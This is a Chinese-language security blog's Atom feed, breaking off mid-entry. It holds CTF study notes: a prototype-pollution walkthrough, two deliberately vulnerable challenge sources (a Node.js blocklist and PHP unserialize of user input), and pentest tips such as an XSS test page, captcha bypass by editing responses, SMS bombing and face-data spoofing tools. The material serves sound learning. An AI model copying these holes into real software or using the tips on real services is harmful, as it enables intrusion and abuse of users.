<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tsunamori&#39;s blog</title>
  
  
  <link href="https://tsunamori.github.io/atom.xml" rel="self"/>
  
  <link href="https://tsunamori.github.io/"/>
  <updated>2022-02-21T09:54:23.888Z</updated>
  <id>https://tsunamori.github.io/</id>
  
  <author>
    <name>Tsunamori</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="https://tsunamori.github.io/wiki/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://tsunamori.github.io/wiki/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-02-21T07:59:53.000Z</published>
    <updated>2022-02-21T09:54:23.888Z</updated>
    
    <content type="html"><![CDATA[<h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><p><a href="https://www.freebuf.com/articles/web/266013.html">https://www.freebuf.com/articles/web/266013.html</a> PHP反序列化漏洞的原理及复现</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;资料&quot;&gt;&lt;a href=&quot;#资料&quot; class=&quot;headerlink&quot; title=&quot;资料&quot;&gt;&lt;/a&gt;资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/266013.html&quot;&gt;https://www</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript-原型链污染</title>
    <link href="https://tsunamori.github.io/wiki/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>https://tsunamori.github.io/wiki/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2022-02-08T23:58:21.000Z</published>
    <updated>2022-02-09T03:05:57.200Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简单的背景介绍"><a href="#简单的背景介绍" class="headerlink" title="简单的背景介绍"></a>简单的背景介绍</h1><h2 id="JavaScript原型链"><a href="#JavaScript原型链" class="headerlink" title="JavaScript原型链"></a>JavaScript原型链</h2><p>JavaScript是动态的，本身不提供一个 <code>class</code> 的实现。即便是在 ES2015/ES6 中引入了 <code>class</code> 关键字，但那也只是语法糖，JavaScript 仍然是基于原型的。</p><p>当谈到继承时，JavaScript只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（prototype）。该原型对象也有一个自己的原型对象（__proto__），层层向上直到一个对象的原型对象为 null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。</p><h2 id="原型链攻击"><a href="#原型链攻击" class="headerlink" title="原型链攻击"></a>原型链攻击</h2><p>实质上是通过解析JSON的方式，将<code>__proto__</code>作为键名而非原型，赋值给对象，从而污染原型链。<br>通常利用<code>对象merge</code>或<code>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</code>的方式控制并操作键名。</p><h1 id="学习材料"><a href="#学习材料" class="headerlink" title="学习材料"></a>学习材料</h1><ol><li>深入理解JavaScript Prototype 污染攻击 <a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></li><li>浅析javascript原型链污染攻击 <a href="https://xz.aliyun.com/t/7182">https://xz.aliyun.com/t/7182</a></li><li>再探 JavaScript 原型链污染到 RCE <a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></li><li>[Node] child_process.fork 与 env 污染 RCE <a href="https://blog.mmf.moe/post/node-fork-proto-env-rce/">https://blog.mmf.moe/post/node-fork-proto-env-rce/</a></li><li>从Kibana-RCE对nodejs子进程创建的思考 <a href="https://xz.aliyun.com/t/6755">https://xz.aliyun.com/t/6755</a></li></ol><p>知识点解说和题解还是得先看1，p神太帅了。3是一个RCE拓展，（就是预判太跳跃了，大佬太快我跟不上QAQ）。</p><p>关于p神举的原型链污染样例，我自己又写了一下，实际上得到的是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; let o2 &#x3D; &#123;a:1, __proto__:&#123;b:2&#125;&#125;</span><br><span class="line">&lt; undefined</span><br><span class="line">&gt;&gt; o2</span><br><span class="line">&lt; &#123;…&#125;</span><br><span class="line">a: 1</span><br><span class="line">&lt;prototype&gt;: &#123;…&#125;</span><br><span class="line">​​b: 2</span><br><span class="line">​​&lt;prototype&gt;: Object &#123; … &#125;</span><br></pre></td></tr></table></figure><p>也就是说，o2的__proto__实际上并没能赋上值，而是赋值给了o2的prototype，所以导致o3被赋值null后无法继承b。<br>利用JSON赋值后，得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; let a2 &#x3D;  JSON.parse(&#39;&#123;&quot;a&quot;:1, &quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#39;)</span><br><span class="line">&lt; undefined</span><br><span class="line">&gt;&gt; a2</span><br><span class="line">&lt; &#123;…&#125;</span><br><span class="line">__proto__: Object &#123; b: 2 &#125;</span><br><span class="line">a: 1</span><br><span class="line">&lt;prototype&gt;: Object &#123; … &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个时候a2的__proto__就已经赋上值，改变了指针指向。</p><p>第4篇是从node.js漏洞角度来分析，在我看来侧重点还是有些区别，更像进阶内容。</p><h1 id="实战分析"><a href="#实战分析" class="headerlink" title="实战分析"></a>实战分析</h1><h2 id="2020-第五空间-hard-node"><a href="#2020-第五空间-hard-node" class="headerlink" title="2020-第五空间-hard_node"></a>2020-第五空间-hard_node</h2><p>这个时候再翻回来看那道题。<br>源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; app.js</span><br><span class="line">const express &#x3D; require(&#39;express&#39;);</span><br><span class="line">const bodyParser &#x3D; require(&#39;body-parser&#39;);</span><br><span class="line">const proc &#x3D; require(&#39;child_process&#39;);</span><br><span class="line">const request &#x3D; require(&#39;request&#39;);</span><br><span class="line">const ip &#x3D; require(&quot;ip&quot;);</span><br><span class="line">const manage &#x3D; require(&quot;.&#x2F;manage.js&quot;);</span><br><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line"></span><br><span class="line">const app &#x3D; express();</span><br><span class="line">app.use(bodyParser.urlencoded(&#123; extended: true &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(express.static(path.join(__dirname, &#39;public&#39;)));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;stop hackers</span><br><span class="line">const disallowedKeys &#x3D; [</span><br><span class="line">    &#39;__proto__&#39;,</span><br><span class="line">    &#39;prototype&#39;,</span><br><span class="line">    &#39;constructor&#39;,</span><br><span class="line">    &#39;eval&#39;,&#39;proccess&#39;,&#39;root&#39;,&#39;global&#39;,&#39;exec&#39;,&#39;!&#39;,&#39;fs&#39;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function isValidPath(segment)&#123;</span><br><span class="line">    disallowedKeys.forEach(evilWord &#x3D;&gt; &#123;</span><br><span class="line">        if(segment.toString().indexOf(evilWord)!&#x3D;&#x3D;-1)&#123;</span><br><span class="line">            return false</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.post(&#39;&#x2F;add&#39;, (req, res) &#x3D;&gt; &#123;</span><br><span class="line">    let ip &#x3D; req.ip;</span><br><span class="line">    console.log(ip.m);</span><br><span class="line">    if (ip.substr(0, 7) &#x3D;&#x3D; &quot;::ffff:&quot;) &#123;</span><br><span class="line">        ip &#x3D; ip.substr(7)</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(&#96;method:$&#123;req.method&#125;,serverip:$&#123;server_ip&#125;,ip:$&#123;ip&#125;&#96;);</span><br><span class="line"></span><br><span class="line">    if (ip !&#x3D; &#39;127.0.0.1&#39; &amp;&amp; ip !&#x3D; server_ip) &#123;</span><br><span class="line">        res.status(403).send(&#39;Not Edit from Local!&#39;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if(req.body.userName &amp;&amp; req.body.nameVal)&#123;</span><br><span class="line">            let username &#x3D; req.body.userName;</span><br><span class="line">            let nameVal &#x3D; req.body.nameVal;</span><br><span class="line"></span><br><span class="line">            if (!isValidPath(username) || !isValidPath(nameVal)) &#123;</span><br><span class="line">                username &#x3D; &#39;username&#39;;</span><br><span class="line">                nameVal &#x3D; &#39;guest&#39;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            manage.set(object, username, nameVal);</span><br><span class="line">            console.log(ip.k);</span><br><span class="line">            console.log(object);</span><br><span class="line"></span><br><span class="line">            res.send(&#96;</span><br><span class="line">            &lt;h1&gt;Edit Success&lt;&#x2F;h1&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;&#x2F;admin&quot;&gt;View Admin Page&lt;&#x2F;a&gt;&#96;)</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            res.send(&#39;param error&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;admin&#39;,(req,res)&#x3D;&gt;&#123;</span><br><span class="line">    if(manage.get(object,&#39;username&#39;,&#39;guest&#39;) &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;</span><br><span class="line">        console.log(&#39;Current User:&#39;+object.username)</span><br><span class="line"></span><br><span class="line">        const child &#x3D; proc.fork(&#96;$&#123;__dirname&#125;&#x2F;public&#x2F;user.js&#96;,[&#39;admin&#39;]);</span><br><span class="line">        child.on(&#39;message&#39;, (body) &#x3D;&gt; &#123;</span><br><span class="line">            res.status(200).send(body);</span><br><span class="line">        &#125;);</span><br><span class="line">        child.on(&#39;close&#39;, (code, signal) &#x3D;&gt; &#123;</span><br><span class="line">            console.log(&#96;subproccess ended with $&#123;signal&#125;&#96;);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        res.status(403).send(&#39;Only Admin Can View this&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;getContent&#39;,(req,res)&#x3D;&gt;&#123;</span><br><span class="line">    res.sendfile(&#96;$&#123;__dirname&#125;&#x2F;public&#x2F;guest.html&#96;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;&#39;, (req,res) &#x3D;&gt; &#123;</span><br><span class="line">    &#x2F;&#x2F; console.log(req.body)</span><br><span class="line">    let uri &#x3D; req.query.url? req.query.url: &#39;http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;getContent&#39;;</span><br><span class="line">    console.log(uri)</span><br><span class="line"></span><br><span class="line">    try&#123;</span><br><span class="line">        request.get(uri,(err,response,data)&#x3D;&gt;&#123;</span><br><span class="line">            if (!err &amp;&amp; response.statusCode &#x3D;&#x3D; 200) &#123;</span><br><span class="line">                res.send(data);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                console.log(err);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        console.log(e);</span><br><span class="line">    &#125;finally&#123;</span><br><span class="line">        console.log(&#39;Make Server Continue Running&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">var object &#x3D; &#123;username:&#39;guest&#39;&#125;;</span><br><span class="line">var server_ip &#x3D; ip.address();</span><br><span class="line"></span><br><span class="line">app.listen(3002);</span><br><span class="line">console.log(&#96;$&#123;server_ip&#125; is starting at port 3000&#96;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; manage.js</span><br><span class="line">const isObj &#x3D; require(&#39;is-obj&#39;);</span><br><span class="line">var manage &#x3D; &#123;</span><br><span class="line">    getPathSegments: function(path) &#123;</span><br><span class="line">        const pathArray &#x3D; path.split(&#39;.&#39;);</span><br><span class="line">        const parts &#x3D; [];</span><br><span class="line">        for (let i &#x3D; 0; i &lt; pathArray.length; i++) &#123;</span><br><span class="line">            let p &#x3D; pathArray[i];</span><br><span class="line">            while (p[p.length - 1] &#x3D;&#x3D;&#x3D; &#39;\\&#39; &amp;&amp; pathArray[i + 1] !&#x3D;&#x3D; undefined) &#123;</span><br><span class="line">                p &#x3D; p.slice(0, -1);</span><br><span class="line">                p +&#x3D; pathArray[++i];</span><br><span class="line">            &#125;</span><br><span class="line">            parts.push(p);</span><br><span class="line">        &#125;</span><br><span class="line">        return parts;</span><br><span class="line">    &#125;,</span><br><span class="line">    get: function(object, path, value) &#123;</span><br><span class="line">        if (!isObj(object) || typeof path !&#x3D;&#x3D; &#39;string&#39;) &#123;</span><br><span class="line">            return value &#x3D;&#x3D;&#x3D; undefined ? object : value;</span><br><span class="line">        &#125;</span><br><span class="line">        const pathArray &#x3D; this.getPathSegments(path);</span><br><span class="line">        for (let i &#x3D; 0; i &lt; pathArray.length; i++) &#123;</span><br><span class="line">            if (!Object.prototype.propertyIsEnumerable.call(object, pathArray[i])) &#123;</span><br><span class="line">                return value;</span><br><span class="line">            &#125;</span><br><span class="line">            object &#x3D; object[pathArray[i]];</span><br><span class="line">            if (object &#x3D;&#x3D;&#x3D; undefined || object &#x3D;&#x3D;&#x3D; null) &#123;</span><br><span class="line">                if (i !&#x3D;&#x3D; pathArray.length - 1) &#123;</span><br><span class="line">                    return value;</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return object;</span><br><span class="line">    &#125;,</span><br><span class="line">    set: function(object, path, value) &#123;</span><br><span class="line">        Object.keys(Object.prototype).forEach(function(Val)&#123;</span><br><span class="line">            if(!Object.hasOwnProperty(Val))&#123;</span><br><span class="line">                delete Object.prototype[Val];</span><br><span class="line">                console.log(&#96;$&#123;Val&#125; is delete&#96;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        if (!isObj(object) || typeof path !&#x3D;&#x3D; &#39;string&#39;) &#123;</span><br><span class="line">            return object;</span><br><span class="line">        &#125;</span><br><span class="line">        const root &#x3D; object;</span><br><span class="line">        const pathArray &#x3D; this.getPathSegments(path);</span><br><span class="line">        for (let i &#x3D; 0; i &lt; pathArray.length; i++) &#123;</span><br><span class="line">            const p &#x3D; pathArray[i];</span><br><span class="line">            if (!isObj(object[p])) &#123;</span><br><span class="line">                object[p] &#x3D; &#123;&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            if (i &#x3D;&#x3D;&#x3D; pathArray.length - 1) &#123;</span><br><span class="line">                object[p] &#x3D; value;</span><br><span class="line">            &#125;</span><br><span class="line">            object &#x3D; object[p];</span><br><span class="line">        &#125;</span><br><span class="line">        return root;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">module.exports &#x3D; manage </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简单的背景介绍&quot;&gt;&lt;a href=&quot;#简单的背景介绍&quot; class=&quot;headerlink&quot; title=&quot;简单的背景介绍&quot;&gt;&lt;/a&gt;简单的背景介绍&lt;/h1&gt;&lt;h2 id=&quot;JavaScript原型链&quot;&gt;&lt;a href=&quot;#JavaScript原型链&quot; class</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>CTF MD5</title>
    <link href="https://tsunamori.github.io/wiki/WP-CTFHub-Web/"/>
    <id>https://tsunamori.github.io/wiki/WP-CTFHub-Web/</id>
    <published>2022-02-08T16:30:06.000Z</published>
    <updated>2022-02-21T07:52:20.532Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2020"><a href="#2020" class="headerlink" title="2020"></a>2020</h2><h3 id="第五空间-决赛-hard-node-node-js原型链污染"><a href="#第五空间-决赛-hard-node-node-js原型链污染" class="headerlink" title="第五空间-决赛 hard_node (node.js原型链污染)"></a>第五空间-决赛 hard_node (node.js原型链污染)</h3><p>这个题看了原型链污染没什么灵感（因为没找到可以推的源码），最终在某个blog上找到了源码和WP （<a href="https://blog.mmf.moe/post/node-fork-proto-env-rce/">https://blog.mmf.moe/post/node-fork-proto-env-rce/</a> ），但似乎不能照着拿flag，不知道是不是后续被做了改动，但这个知识点算是学会了。<br>另外，httpie可以使用<code>-v</code>参数来查看具体发送出去的请求内容。</p><h3 id="RCTF-swoole-反序列化"><a href="#RCTF-swoole-反序列化" class="headerlink" title="RCTF-swoole (反序列化)"></a>RCTF-swoole (反序列化)</h3><p>CTFHub的靶场时间很短，所以还是拿到源码先线下分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env php</span><br><span class="line">&lt;?php</span><br><span class="line">Swoole\Runtime::enableCoroutine($flags &#x3D; SWOOLE_HOOK_ALL);</span><br><span class="line">$http &#x3D; new Swoole\Http\Server(&quot;0.0.0.0&quot;, 80);</span><br><span class="line">$http-&gt;on(&quot;request&quot;,</span><br><span class="line">    function (Swoole\Http\Request $request, Swoole\Http\Response $response) &#123;</span><br><span class="line">        Swoole\Runtime::enableCoroutine();</span><br><span class="line">        $response-&gt;header(&#39;Content-Type&#39;, &#39;text&#x2F;plain&#39;);</span><br><span class="line">        &#x2F;&#x2F; $response-&gt;sendfile(&#39;&#x2F;flag&#39;);</span><br><span class="line">        if (isset($request-&gt;get[&#39;phpinfo&#39;])) &#123;</span><br><span class="line">            &#x2F;&#x2F; Prevent racing condition</span><br><span class="line">            &#x2F;&#x2F; ob_start();phpinfo();</span><br><span class="line">            &#x2F;&#x2F; return $response-&gt;end(ob_get_clean());</span><br><span class="line">            return $response-&gt;sendfile(&#39;phpinfo.txt&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (isset($request-&gt;get[&#39;code&#39;])) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                $code &#x3D; $request-&gt;get[&#39;code&#39;];</span><br><span class="line">                if (!preg_match(&#39;&#x2F;\x00&#x2F;&#39;, $code)) &#123;</span><br><span class="line">                    $a &#x3D; unserialize($code);</span><br><span class="line">                    $a();</span><br><span class="line">                    $a &#x3D; null;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (\Throwable $e) &#123;</span><br><span class="line">                var_dump($code);</span><br><span class="line">                var_dump($e-&gt;getMessage());</span><br><span class="line">                &#x2F;&#x2F; do nothing</span><br><span class="line">            &#125;</span><br><span class="line">            return $response-&gt;end(&#39;Done&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        $response-&gt;sendfile(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$http-&gt;start();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2020&quot;&gt;&lt;a href=&quot;#2020&quot; class=&quot;headerlink&quot; title=&quot;2020&quot;&gt;&lt;/a&gt;2020&lt;/h2&gt;&lt;h3 id=&quot;第五空间-决赛-hard-node-node-js原型链污染&quot;&gt;&lt;a href=&quot;#第五空间-决赛-hard-no</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>偶然学到的渗透小tips</title>
    <link href="https://tsunamori.github.io/wiki/%E5%81%B7%E5%AD%A6%E7%9A%84%E6%B8%97%E9%80%8F%E5%B0%8Ftips/"/>
    <id>https://tsunamori.github.io/wiki/%E5%81%B7%E5%AD%A6%E7%9A%84%E6%B8%97%E9%80%8F%E5%B0%8Ftips/</id>
    <published>2021-12-06T01:40:18.000Z</published>
    <updated>2022-03-21T02:27:25.995Z</updated>
    
    <content type="html"><![CDATA[<p>(人菜就要多学习)</p><h1 id="简单套路"><a href="#简单套路" class="headerlink" title="简单套路"></a>简单套路</h1><ol><li>当请求为<code>数据更新操作（添加、删除、修改等）</code>，且请求包没添加（或可绕过）Referer来源地址、随机CSRF-token时，考虑CSRF/XSRF攻击（burp自动生成payload）</li><li>上传位置可以尝试上传html，验证有无html解析（毕竟万年碰不到一个能传马的点了！），危害为钓鱼、挂马、挂黑页等。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">          &lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></li><li>测越权，burp插件携带权限cookie批量请求值得拥有（实现该功能的插件很多，比如Autorize）。</li><li>JS经常泄漏各种API接口（找链接： <a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a> ，也有非链接需要自己构造包含函数名称及参数的数据包的JS，被动搜索浏览器插件： <a href="https://github.com/momosecurity/FindSomething">https://github.com/momosecurity/FindSomething</a> ）。</li><li>链接里带有URL的点可以试试改成任意URL测重定向（大概算是依靠链接前半部分造成链接可信任，结合短链接等伪装手法，重定向钓鱼）。</li></ol><h1 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h1><h2 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h2><ol><li><em><strong>逆向分析YYDS！</strong></em></li><li>APP脱壳找证书，放进抓包工具反编译流量（适用于流量内容不可见的情况，具体教程找找看）。</li><li><code>adb logcat &gt;&gt; x.txt</code>输出本地日志，可能包含本机用户使用APP时输入的敏感信息。</li><li>快速并发数据包，可以实现批量发送短信、刷赞等。（burp-turbo）</li><li>将拦截的<code>响应包</code>内容从fail改为success可以实现验证码绕过等（是原理清楚但从来没改过响应包的我），证明校验为前端校验。</li><li>Activity劫持（涉及安卓端命令调用了，目测是比较冷门可挖的）。</li><li>LaunchAnyWhere （<a href="https://chan-shaw.github.io/2020/04/12/LaunchAnyWhere%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86/%EF%BC%89">https://chan-shaw.github.io/2020/04/12/LaunchAnyWhere%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86/）</a></li><li>(这是一条防御办法)当APP做证书绑定后，可以在被抓包时不发送业务请求（但据说有办法仍然实现抓包，目前未知。）。</li><li>以下是奇怪的root后替换人脸数据的工具：<ol><li>Magisk <a href="https://github.com/topjohnwu/Magisk">https://github.com/topjohnwu/Magisk</a></li><li>Riru <a href="https://github.com/RikkaApps/Riru">https://github.com/RikkaApps/Riru</a></li><li>LSPosed <a href="https://github.com/LSPosed/LSPosed">https://github.com/LSPosed/LSPosed</a></li><li>virtualcam <a href="https://github.com/w2016561536/android_virtual_cam">https://github.com/w2016561536/android_virtual_cam</a></li></ol></li></ol><h2 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h2><ol><li>发送请求参数被加密时，可解包找公钥。（这怕是不太能防？还是说果然RSA/RSA2不靠谱？）</li><li>绕过批量发送限制：在参数末尾每次多加一个对整体无作用的<code>+</code>（猜测只有当参数在请求末端可行？）。</li><li>测批量时，不仅可以考虑本网站用户的手机号被批量的问题，也可以加上非注册用户手机号实现批量轰炸的情况（扩大漏洞影响）。</li></ol><h2 id="Web"><a href="#Web" class="headerlink" 